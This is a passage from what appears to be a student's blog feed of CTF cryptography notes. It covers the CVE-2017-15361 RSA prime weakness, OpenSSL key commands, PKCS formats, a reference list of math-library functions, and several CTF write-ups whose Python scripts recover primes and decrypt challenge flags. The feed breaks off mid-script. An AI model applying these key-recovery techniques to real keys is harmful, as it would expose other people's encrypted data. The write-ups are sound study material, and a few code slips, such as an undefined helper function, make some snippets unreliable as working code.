    <url>/2022/11/01/22-11-01-qq/</url>
    <content><![CDATA[<p>The problem is mainly based on the <strong>backdoor</strong>. In RSA library, it has the CVE of <code>CVE-2017-15361</code>.In this case, we can calculate the prime which is likely random with the equation that:<br>
$$<br>
Prime = k \times M + (65537^{a} \mod M)<br>
$$<br>
It means that produce the list of primes and make them to collide， which satisfy the condition, thus output the target prime.</p>
<p>Also，the PKI system has different standards， we make some distinctions between different standards.</p>
<span id="more"></span>
<h1>RSA Backdoor</h1>
<blockquote>
<p>reference: <a href="https://asecuritysite.com/encryption/copper">https://asecuritysite.com/encryption/copper</a></p>
</blockquote>
<h2 id="description">description</h2>
<p>In RSALib, the prime is produced by the equaction:<br>
$$<br>
Prime = k \times M + 65537^{a} \mod M<br>
$$<br>
which means that the $M$ is the multiplication of the generated primes.<br>
$$<br>
M = \prod_{i=1}^{n}{P_{i}}= P_{1} \times P_{2} \times \cdots \times P_{n}<br>
$$<br>
$M$ must be large and is around the same size of they generated. The weakness is the $k$ and $a$ are relatively small values. The entropy is also must drop.</p>
<p>The problem is common provided with $c$, $e$ and $n$, and just do the command<code>RSA_Backdoor(n)</code>. If the problems satisfy the conditions, the  function will return the $p$ and the $q$.</p>
<h1>Openssl</h1>
<blockquote>
<p>relate to the PKI system.</p>
</blockquote>
<h2 id="generate">generate</h2>
<p>In kali, you can directly input the command that <code>openssl</code>.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">openssl genrsa -out [pri].pem 1024</span><br><span class="line">openssl rsa -in [pri].pem -pubout -out [pub].pem</span><br><span class="line"></span><br><span class="line">## if needs to encrypto, like AES or anything else</span><br><span class="line">openssl genrsa [-aes256 -passout pass:111111] -out [pri].key 2048</span><br><span class="line">openssl rsa -in [pri].key -pubout -out [pri].key</span><br><span class="line">Enter pass phrase for [pri].key:</span><br><span class="line"># openssl rsa -in [pri].key -passin pass:111111 -pubout -out [pub].key</span><br><span class="line">writing RSA key</span><br></pre></td></tr></table></figure>
<p>If in python, we can import something to ensure the same consequence.</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.PublicKey <span class="keyword">import</span> RSA</span><br><span class="line"><span class="comment"># RSA.generate(bits, randfunc = None, e = 65537)</span></span><br><span class="line"><span class="comment"># - bits: bit_length</span></span><br><span class="line"><span class="comment"># - randfunc: Crypto.Random.get_random_bytes()</span></span><br><span class="line"><span class="comment"># - e(int): odd, common is 65537</span></span><br><span class="line">rsa = rsa.generate(<span class="number">1024</span>)</span><br><span class="line"><span class="comment"># export prikey</span></span><br><span class="line">pri = rsa.exportKey()</span><br><span class="line"><span class="comment"># export pubkey</span></span><br><span class="line">pub = rsa.publickey().exportKey()</span><br><span class="line"><span class="comment"># or write in the file</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;pri.pem&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f1:</span><br><span class="line">    f1.write(pri)</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;pub.pem&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f2:</span><br><span class="line">    f2.write(pub)</span><br></pre></td></tr></table></figure>
<h2 id="reverse">reverse</h2>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># PKCS1 -&gt; PKCS8 privatekey</span><br><span class="line">openssl pkcs8 -topk8 -inform PEM -in rsa_pri.pem -outform PEM -nocrypt -out rsa_pri_pkcs8.pem</span><br><span class="line"></span><br><span class="line"># PKCS8 -&gt; PKCS1 privatekey</span><br><span class="line">openssl rsa -inform PEM -in rsa_pri_pkcs8.pem -outform PEM -out rsa_pri_pkcs1.pem</span><br><span class="line"></span><br><span class="line"># PKCS8 -&gt; PKCS1 publickey</span><br><span class="line">openssl rsa -pubin -in rsa_pub.pem -RSAPublicKey_out -out rsa_pub_pkcs1.pem</span><br><span class="line"></span><br><span class="line"># PKCS1 -&gt; PKCS8 publickey</span><br><span class="line">openssl rsa -RSAPublicKey_in -in rsa_pub_pkcs1.pem -pubout -out rsa_pub_pkcs8.pem</span><br></pre></td></tr></table></figure>
<h1>Key_Differences</h1>
<h2 id="PKCS-8">PKCS#8</h2>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># pubkey</span><br><span class="line">-----BEGIN PUBLIC KEY-----</span><br><span class="line">-----END PUBLIC KEY-----</span><br><span class="line"></span><br><span class="line"># prikey</span><br><span class="line">-----BEGIN PRIVATE KEY-----</span><br><span class="line">-----END PRIVATE KEY-----</span><br><span class="line"></span><br><span class="line"># prikey encrypted</span><br><span class="line">-----BEGIN PRIVATE KEY-----</span><br><span class="line">-----END PRIVATE KEY-----</span><br></pre></td></tr></table></figure>
<h2 id="PKCS-1">PKCS#1</h2>
<blockquote>
<p>import rsa</p>
<p>the default is PKCS#1</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># pubkey</span><br><span class="line">-----BEGIN RSA PUBLIC KEY-----</span><br><span class="line">-----END RSA PUBLIC KEY-----</span><br><span class="line"></span><br><span class="line"># prikey</span><br><span class="line">-----BEGIN RSA PRIVATE KEY-----</span><br><span class="line">-----END RSA PRIVATE KEY-----</span><br></pre></td></tr></table></figure>
<h1>Rsatool</h1>
<blockquote>
<p><a href="https://github.com/ius/rsatool">GitHub - ius/rsatool: rsatool can be used to calculate RSA and RSA-CRT parameters</a></p>
</blockquote>
<h2 id="requirements">requirements</h2>
<ul>
<li>python3.7+</li>
<li>pyasn1</li>
<li>gmpy2</li>
</ul>
<h2 id="usage">usage</h2>
<h3 id="pem">pem</h3>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">python3 rsatool.py -f PEM -o key.pem -n [n] -d [d]</span><br><span class="line">python3 rsatool.py -f PEM -o private.pem -p [p] -q [q] -e [e]</span><br></pre></td></tr></table></figure>
<h3 id="der">der</h3>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python3 rsatool.py -f DER -o key.der -p [p] -q [q]</span><br></pre></td></tr></table></figure>
<h1>Pem in RSA</h1>
<p>The pem can be used in different ways in RSA.</p>
<p>One is to extract the $n$ and the $e$—— when you get $p$, $q$ from the $n$, we can change <code>flag.enc</code> to $c$ by using the function <code>bytes_to_long()</code>.</p>
<p>The other way is also extract the $n$ and the $e$ ——however, we MUST construct the primes and others into the <code>pri.pem</code>. Using the <code>pri.pem</code>，and we can decrypt the <code>flag.enc</code> to get the message.</p>
<h2 id="1101-qq">[1101]qq</h2>
<blockquote>
<p>mainly using bytes_to_long()</p>
</blockquote>
<h3 id="flag-enc">flag.enc</h3>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">CwhE2kUKvphGegBRgnZeM8iE2oTPfmzMYfL4cO262NkQpId+JzH4pEyiS3cdyhDRsU+huX9cnIE=</span><br></pre></td></tr></table></figure>
<h3 id="pub-key-pem">pub_key.pem</h3>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-----BEGIN PUBLIC KEY-----</span><br><span class="line">MFMwDQYJKoZIhvcNAQEBBQADQgAwPwI4EkoKC0EfUXgDvsQUYRI+j0/XPrqQxHJ+</span><br><span class="line">v3CKL9WVp5SMk0Njud03to6sxuvPt93fSGHkAsW+wHsCAwEAAQ==</span><br><span class="line">-----END PUBLIC KEY-----</span><br></pre></td></tr></table></figure>
<h3 id="exp-py"><a href="http://exp.py">exp.py</a></h3>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.PublicKey <span class="keyword">import</span> RSA</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;pub_key.pem&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    pub = RSA.import_key(f.read())</span><br><span class="line"></span><br><span class="line"><span class="comment"># print(pub.e)</span></span><br><span class="line"><span class="comment"># print(pub.n)</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;flag.enc&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    cipher = base64.b64decode(f.read())</span><br><span class="line">c = bytes_to_long(cipher)</span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">n = <span class="number">51926993165717444667250925590498598946377319881662556610174970468991791873398735735101740226707561968771963673353253102616246155657339</span></span><br><span class="line">p, q = RSA_Backdoor(n)</span><br><span class="line">N = (p-<span class="number">1</span>) * (q-<span class="number">1</span>)</span><br><span class="line">d = <span class="built_in">int</span>(gmpy2.invert(e, N))</span><br><span class="line">m = <span class="built_in">pow</span>(c, d, n)</span><br><span class="line"><span class="built_in">print</span>(m)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(m).decode())</span><br><span class="line"><span class="comment"># 2761328357323929478367647741211050583178552594955214217850793389028221</span></span><br><span class="line"><span class="comment"># flag&#123;We@k_Pr1me_1s_d@nger0us&#125;</span></span><br></pre></td></tr></table></figure>
<h2 id="ACTF2018-可怜的RSA">[ACTF2018]可怜的RSA</h2>
<blockquote>
<p>construct to private key</p>
</blockquote>
<h3 id="flag-enc-2">flag.enc</h3>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GVd1d3viIXFfcHapEYuo5fAvIiUS83adrtMW/MgPwxVBSl46joFCQ1plcnlDGfL19K/3PvChV6n5QGohzfVyz2Z5GdTlaknxvHDUGf5HCukokyPwK/1EYU7NzrhGE7J5jPdi0Aj7xi/Odxy0hGMgpaBLd/nL3N8O6i9pc4Gg3O8soOlciBG/6/xdfN3SzSStMYIN8nfZZMSq3xDDvz4YB7TcTBh4ik4wYhuC77gmT+HWOv5gLTNQ3EkZs5N3EAopy11zHNYU80yv1jtFGcluNPyXYttU5qU33jcp0Wuznac+t+AZHeSQy5vk8DyWorSGMiS+J4KNqSVlDs12EqXEqqJ0uA==</span><br></pre></td></tr></table></figure>
<h3 id="public-key">public.key</h3>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-----BEGIN PUBLIC KEY-----</span><br><span class="line">MIIBJDANBgkqhkiG9w0BAQEFAAOCAREAMIIBDAKCAQMlsYv184kJfRcjeGa7Uc/4</span><br><span class="line">3pIkU3SevEA7CZXJfA44bUbBYcrf93xphg2uR5HCFM+Eh6qqnybpIKl3g0kGA4rv</span><br><span class="line">tcMIJ9/PP8npdpVE+U4Hzf4IcgOaOmJiEWZ4smH7LWudMlOekqFTs2dWKbqzlC59</span><br><span class="line">NeMPfu9avxxQ15fQzIjhvcz9GhLqb373XDcn298ueA80KK6Pek+3qJ8YSjZQMrFT</span><br><span class="line">+EJehFdQ6yt6vALcFc4CB1B6qVCGO7hICngCjdYpeZRNbGM/r6ED5Nsozof1oMbt</span><br><span class="line">Si8mZEJ/Vlx3gathkUVtlxx/+jlScjdM7AFV5fkRidt0LkwosDoPoRz/sDFz0qTM</span><br><span class="line">5q5TAgMBAAE=</span><br><span class="line">-----END PUBLIC KEY-----</span><br></pre></td></tr></table></figure>
<h3 id="exp-py-2"><a href="http://exp.py">exp.py</a></h3>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.PublicKey <span class="keyword">import</span> RSA</span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> PKCS1_OAEP</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">2. public.key：rb-&gt;RSA.import_key-&gt;e,n</span></span><br><span class="line"><span class="string">3. construct to privatekey</span></span><br><span class="line"><span class="string">    1. (n,e,d,(p),(q)) to save</span></span><br><span class="line"><span class="string">    2. RSA.construct() to construct</span></span><br><span class="line"><span class="string">    3. 2.exportKey() import</span></span><br><span class="line"><span class="string">    4. RSA.importKey() export</span></span><br><span class="line"><span class="string">    5. PKCS1_OAEP.new()  -&gt; important!</span></span><br><span class="line"><span class="string">4. d by using invert(), and int(d) to get integer</span></span><br><span class="line"><span class="string">5. use private key to decrypt</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;public.key&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    pub = RSA.import_key(f.read())</span><br><span class="line">e = pub.e</span><br><span class="line">n = pub.n</span><br><span class="line"><span class="comment"># e = 65537</span></span><br><span class="line"><span class="comment"># n = 79832181757332818552764610761349592984614744432279135328398999801627880283610900361281249973175805069916210179560506497075132524902086881120372213626641879468491936860976686933630869673826972619938321951599146744807653301076026577949579618331502776303983485566046485431039541708467141408260220098592761245010678592347501894176269580510459729633673468068467144199744563731826362102608811033400887813754780282628099443490170016087838606998017490456601315802448567772411623826281747245660954245413781519794295336197555688543537992197142258053220453757666537840276416475602759374950715283890232230741542737319569819793988431443</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># yafu-x64/factordb.com</span></span><br><span class="line">p = <span class="number">3133337</span></span><br><span class="line">q = <span class="number">25478326064937419292200172136399497719081842914528228316455906211693118321971399936004729134841162974144246271486439695786036588117424611881955950996219646807378822278285638261582099108339438949573034101215141156156408742843820048066830863814362379885720395082318462850002901605689761876319151147352730090957556940842144299887394678743607766937828094478336401159449035878306853716216548374273462386508307367713112073004011383418967894930554067582453248981022011922883374442736848045920676341361871231787163441467533076890081721882179369168787287724769642665399992556052144845878600126283968890273067575342061776244939</span></span><br><span class="line">N = (p-<span class="number">1</span>) * (q-<span class="number">1</span>)</span><br><span class="line">d = <span class="built_in">int</span>(gmpy2.invert(e, N))</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;flag.enc&#x27;</span>, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    cipher = b64decode(f.read())</span><br><span class="line">    <span class="comment"># print(c)</span></span><br><span class="line">con = RSA.construct((n, e, d, p, q))</span><br><span class="line">pri = PKCS1_OAEP.new(RSA.importKey(con.exportKey()))</span><br><span class="line">m = pri.decrypt(cipher)</span><br><span class="line"><span class="built_in">print</span>(m)</span><br><span class="line"><span class="comment"># b&#x27;afctf&#123;R54_|5_$0_B0rin9&#125;&#x27;</span></span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>Studying</category>
      </categories>
      <tags>
        <tag>RSA</tag>
        <tag>factor</tag>
        <tag>openssl</tag>
        <tag>backdoor</tag>
      </tags>
  </entry>
  <entry>
    <title>22-11-15-functions</title>
    <url>/2022/11/15/22-11-15-functions/</url>
    <content><![CDATA[<p>To conclude the functions that I met in these years.</p>
<p>Just show that how the functions and equations</p>
<p>make a one-to-one relation.</p>
<p>Relating to <strong>python</strong>, <strong>sagemath</strong>……</p>
<span id="more"></span>
<h1>python3</h1>
<h2 id="normal">normal</h2>
<h3 id="num-bit-length">num.bit_length()</h3>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">generate_prime(<span class="number">10</span>).bit_length()</span><br><span class="line"><span class="comment"># 10</span></span><br><span class="line">num = <span class="number">1024</span></span><br><span class="line">num.bit_length()</span><br><span class="line"><span class="comment"># 11</span></span><br><span class="line"><span class="number">1024.</span>bit_length()</span><br><span class="line"><span class="comment"># error</span></span><br></pre></td></tr></table></figure>
<h2 id="gmpy2">gmpy2</h2>
<h3 id="gcd">gcd()</h3>
<blockquote>
<p>input: gcd(a, b)</p>
<p>output: the greatest</p>
</blockquote>
<p>To solve out the greatest common factor between $a$ and $b$</p>
<h3 id="gcdext-a-b">gcdext(a, b)</h3>
<h3 id="invert-a-n">invert(a, n)</h3>
<h3 id="powmod-a-b-c">powmod(a, b, c)</h3>
<h3 id="next-prime-a">next_prime(a)</h3>
<h3 id="iroot">iroot()</h3>
<h2 id="pycryptodome">pycryptodome</h2>
<h3 id="bytes-to-long">bytes_to_long()</h3>
<h3 id="long-to-bytes">long_to_bytes()</h3>
<h2 id="sympy">sympy</h2>
<blockquote>
<p><a href="https://geek-docs.com/sympy/sympy-method/python-sympy-solve-method.html">sympy.solve()方法|极客教程 (geek-docs.com)</a></p>
</blockquote>
<h3 id="symbol">symbol()</h3>
<blockquote>
<p>input: unknowns</p>
<p>output: defined unknowns</p>
</blockquote>
<p>Define the unknowns, such as $x$, $y$, etc.</p>
<p>Two ways to define:</p>
<ul>
<li>an unknown quantity: <code>x = Symbol('x')</code></li>
<li>more than one unknown quantity: <code>x, y = symbols('x y')</code></li>
</ul>
<h3 id="solve">solve()</h3>
<blockquote>
<p>input: solve([equations], [unknowns])</p>
<p>output: the root of the equations</p>
</blockquote>
<h2 id="z3">z3</h2>
<p><strong>install</strong></p>
<ul>
<li>cmd <code>pip install z3_solver</code></li>
<li>pycharm <code>setting -&gt; python interpreter -&gt; + -&gt; search for z3_solver.eg</code></li>
</ul>
<p><strong>import</strong></p>
<ul>
<li><code>from z3 import *</code></li>
<li><code>import z3</code></li>
</ul>
<h3 id="Int-Ints">Int()/Ints()</h3>
<blockquote>
<p>input: unknown</p>
<p>output: Integer variable.</p>
<p>eg: 3, 5, 7……</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a = Int(<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line"><span class="comment"># or</span></span><br><span class="line">a, b = Ints(<span class="string">&#x27;a b&#x27;</span>)</span><br></pre></td></tr></table></figure>
<h3 id="Real-Reals">Real()/Reals()</h3>
<blockquote>
<p>input: unknown</p>
<p>output: Real variable.</p>
<p>eg: $2^{\frac{1}{2}}$……</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a = Real(<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line"><span class="comment"># or </span></span><br><span class="line">a, b = Reals(<span class="string">&#x27;a b&#x27;</span>)</span><br></pre></td></tr></table></figure>
<p><em>Same above.</em></p>
<h3 id="BitVec-BitVecs">BitVec()/BitVecs()</h3>
<blockquote>
<p>input: bit vector unknown</p>
<p>output: bit vectors</p>
<p>eg: 11000001, 11111000……</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a = BitVec(<span class="string">&#x27;a&#x27;</span>, <span class="number">8</span>)</span><br><span class="line"><span class="comment"># or</span></span><br><span class="line">a, b = BitVecs(<span class="string">&#x27;a b&#x27;</span>, <span class="number">8</span>)</span><br></pre></td></tr></table></figure>
<h3 id="Solver">Solver()</h3>
<blockquote>
<p>create a  Solver to calculate</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">s = Solver()</span><br></pre></td></tr></table></figure>
<h3 id="add">add()</h3>
<blockquote>
<p>input: equations or constraints</p>
<p>output: add to conditions</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># s = Solver()</span></span><br><span class="line"><span class="comment"># equ = [a + b == 10, a - b == 6]</span></span><br><span class="line">s.add(equ)</span><br></pre></td></tr></table></figure>
<h3 id="check">check()</h3>
<blockquote>
<p>to check the conditions and solve out</p>
<p>output: sat / unsat</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># s.add(equ)</span></span><br><span class="line">s.check()</span><br><span class="line"><span class="comment"># sat</span></span><br></pre></td></tr></table></figure>
<h3 id="model">model()</h3>
<blockquote>
<p>solve out the satisfied roots</p>
<p>output: the roots</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># s.check()</span></span><br><span class="line"><span class="comment"># if the output is sat that stands for there exist roots</span></span><br><span class="line">s.model()</span><br><span class="line"><span class="comment"># [a = 8, b = 2]</span></span><br></pre></td></tr></table></figure>
<h2 id="itertools">itertools</h2>
<blockquote>
<p>Traverse all possibilities</p>
</blockquote>
<blockquote>
<p><a href="https://docs.python.org/3/library/itertools.html">itertools — Functions creating iterators for efficient looping — Python 3.11.1 documentation</a></p>
</blockquote>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> itertools</span><br></pre></td></tr></table></figure>
<h3 id="product">product()</h3>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">product(<span class="string">&#x27;ABCD&#x27;</span>, repeat = <span class="number">2</span>)</span><br><span class="line"><span class="comment"># AA AB AC AD BA BB BC BD CA CB CC CD DA DB DC DD</span></span><br></pre></td></tr></table></figure>
<h3 id="permutations">permutations()</h3>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">permutations(<span class="string">&#x27;ABCD&#x27;</span>, <span class="number">2</span>)</span><br><span class="line"><span class="comment"># AB AC AD BA BC BD CA CB CD DA DB DC</span></span><br><span class="line"><span class="comment"># no repeated compared to result above</span></span><br></pre></td></tr></table></figure>
<h3 id="combinations">combinations()</h3>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">combinations(<span class="string">&#x27;ABCD&#x27;</span>, <span class="number">2</span>)</span><br><span class="line"><span class="comment"># AB AC AD BC BD CD</span></span><br></pre></td></tr></table></figure>
<h3 id="combinations-with-replacement">combinations_with_replacement()</h3>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">combinations_with_replacement(<span class="string">&#x27;ABCD&#x27;</span>, <span class="number">2</span>)</span><br><span class="line"><span class="comment"># AA AB AC AD BB BC BD CC CD DD</span></span><br><span class="line"><span class="comment"># repeated compared to result above</span></span><br></pre></td></tr></table></figure>
<h2 id="libnum">libnum</h2>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> libnum <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> libnum</span><br></pre></td></tr></table></figure>
<h3 id="n2s-n">n2s(n)</h3>
<blockquote>
<p>number convert to string</p>
</blockquote>
<h3 id="s2n-s">s2n(s)</h3>
<blockquote>
<p>string convert to number</p>
</blockquote>
<h3 id="s2b-s">s2b(s)</h3>
<blockquote>
<p>string convert to binary</p>
</blockquote>
<h3 id="b2s-b">b2s(b)</h3>
<blockquote>
<p>binary convert to string</p>
</blockquote>
<h3 id="prime-n">prime(n)</h3>
<blockquote>
<p>produce primes &lt; = n</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>primes(<span class="number">14</span>)</span><br><span class="line">[<span class="number">2</span>, <span class="number">3</span>, <span class="number">5</span>, <span class="number">7</span>, <span class="number">11</span>, <span class="number">13</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>primes(<span class="number">13</span>)</span><br><span class="line">[<span class="number">2</span>, <span class="number">3</span>, <span class="number">5</span>, <span class="number">7</span>, <span class="number">11</span>, <span class="number">13</span>]</span><br></pre></td></tr></table></figure>
<h3 id="generate-prime-n">generate_prime(n)</h3>
<blockquote>
<p>generate bit_length=n prime</p>
</blockquote>
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">generate_prime(<span class="number">10</span>)</span><br><span class="line"><span class="comment"># 787</span></span><br></pre></td></tr></table></figure>
<h1>sagemath</h1>
<blockquote>
<p><a href="https://doc.sagemath.org/html/en/reference/">Reference Manual (sagemath.org)</a></p>
</blockquote>
<h2 id="var">var()</h2>
<blockquote>
<p>input: Integer</p>
<p>output:  Integer variables</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">x, y, z = var(<span class="string">&#x27;x y z&#x27;</span>)</span><br></pre></td></tr></table></figure>
<h2 id="solve-2">solve()</h2>
<blockquote>
<p>input: solve([equations], [variables])</p>
<p>output: roots</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">3x-y+z=185</span></span><br><span class="line"><span class="string">2x+3y-z=321</span></span><br><span class="line"><span class="string">x+y+z=173</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line">x, y, z = var(<span class="string">&#x27;x y z&#x27;</span>)</span><br><span class="line">f1 = <span class="number">3</span>*x - y + z == <span class="number">185</span></span><br><span class="line">f2 = <span class="number">2</span>*x + <span class="number">3</span>*y - z == <span class="number">321</span></span><br><span class="line">f3 = x + y + z == <span class="number">185</span></span><br><span class="line">sol = solve([f1, f2, f3], [x, y, z])</span><br><span class="line"><span class="comment"># [[x == 74, y == 68, z == 31]]</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">x*x+x-7943722218936282=0</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line">f = x*x + x - <span class="number">7943722218936282</span></span><br><span class="line">solve([f], [x])</span><br><span class="line"><span class="comment"># [x == 89127561, x == -89127562]</span></span><br></pre></td></tr></table></figure>
<h2 id="PolynomialRing">PolynomialRing?</h2>
<h2 id="Ideal">Ideal?</h2>
]]></content>
      <categories>
        <category>Studying</category>
      </categories>
      <tags>
        <tag>function</tag>
      </tags>
  </entry>
  <entry>
    <title>22-11-16-YD</title>
    <url>/2022/11/16/22-11-16-YD/</url>
    <content><![CDATA[<p>1115-YD-GAME.</p>
<p>Write Up about <strong>crypto</strong> and <strong>misc</strong>.</p>
<p>AK the crypto~</p>
<span id="more"></span><!--toc-->
<h1>rrrrsa</h1>
<ul>
<li>Euler’s totient function</li>
<li>$e$ and $phi$ are not relatively-prime</li>
</ul>
<h2 id="Euler’s-totient-function">Euler’s totient function</h2>
<p>Mainly use the Euler 3, which has the equation that:<br>
$$<br>
\varphi(p^{k}\cdot q^{r}) = \varphi(p^{k})\cdot \varphi(q^{r})<br>
$$</p>
<p>$$<br>
\Longrightarrow \varphi§ \times p^{k-1} \times \varphi(q) \times q^{r-1}<br>
$$</p>
<p>$$<br>
\Longrightarrow (p-1)\times p^{k-1} \times (q-1)\times q^{r-1}<br>
$$</p>
<h2 id="Main">Main</h2>
<p><code>task.py</code></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p=getPrime(<span class="number">256</span>)</span><br><span class="line">q=getPrime(<span class="number">256</span>)</span><br><span class="line">r=getPrime(<span class="number">256</span>)</span><br><span class="line">s=getPrime(<span class="number">256</span>)</span><br><span class="line">n=p**<span class="number">2</span>*q**<span class="number">3</span>*r**<span class="number">4</span>*s**<span class="number">5</span></span><br><span class="line">e=<span class="number">14</span></span><br><span class="line">m=bytes_to_long(flag)</span><br><span class="line">c=<span class="built_in">pow</span>(m,e,n)</span><br><span class="line"><span class="built_in">print</span>(p,q,r,s,c,sep=<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">……</span><br></pre></td></tr></table></figure>
<p><code>exp.py</code></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">p=<span class="number">82740843489176005842917905237448676902781319326096412115804401131397466993701</span></span><br><span class="line">q=<span class="number">85263643568597752465513069151877689268453731648228759206805083081972094635829</span></span><br><span class="line">r=<span class="number">79374890087283111247783732293463483039814224158289962524595401321277418666013</span></span><br><span class="line">s=<span class="number">102732199362754952069273055525350226201958416532282326662545431277468292741447</span></span><br><span class="line">c=<span class="number">209764158198100932214155089968863460960764115788843889450050526143389381127082813487813848764081174468416915862387829518066498286649325136938861327501126507330636283194491774843852097326223633337209701533553768182215060190222820102775941550334063704345167980872865539263669078518722589070762176421658193780663489275300987379291331254855029837613791180120722762611589441493216729829935815928668091245317003984177304991150484204972754604505926951762889894890977781284204135659968910559636276248002638001257927724627172934291321960032984200304503486457400466222152687435733385861015747679424548570249193669289227091923991244140876236848584520997920469772887694030202115298206597699720631193271607873611648764756487112169968220121850963271008810056644983219771177431102811348959976986368053544506721049809904407594329574573889027703243130484608315308768672733480521699846869769824733283356920305979098527936478174996930553057717113709689343835430493021845720498504798696915665856537146177480318328251379204246844497037689723120344053581795715706628542369652261282102647414868089</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line">n = p**<span class="number">2</span>*q**<span class="number">3</span>*r**<span class="number">4</span>*s**<span class="number">5</span></span><br><span class="line"><span class="built_in">print</span>(n)</span><br><span class="line">N = (p-<span class="number">1</span>)*p**(<span class="number">2</span>-<span class="number">1</span>) * (q-<span class="number">1</span>)*q**(<span class="number">3</span>-<span class="number">1</span>) * (r-<span class="number">1</span>)*r**(<span class="number">4</span>-<span class="number">1</span>) * (s-<span class="number">1</span>)*s**(<span class="number">5</span>-<span class="number">1</span>) <span class="comment"># key 1</span></span><br><span class="line">e = <span class="number">14</span></span><br><span class="line">d = invert(e//<span class="number">2</span>, N) <span class="comment"># key2-1</span></span><br><span class="line">m = iroot(powmod(c, d, n), <span class="number">2</span>)[<span class="number">0</span>] <span class="comment"># key2-2</span></span><br><span class="line"><span class="built_in">print</span>(m)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(m))</span><br><span class="line"><span class="comment"># 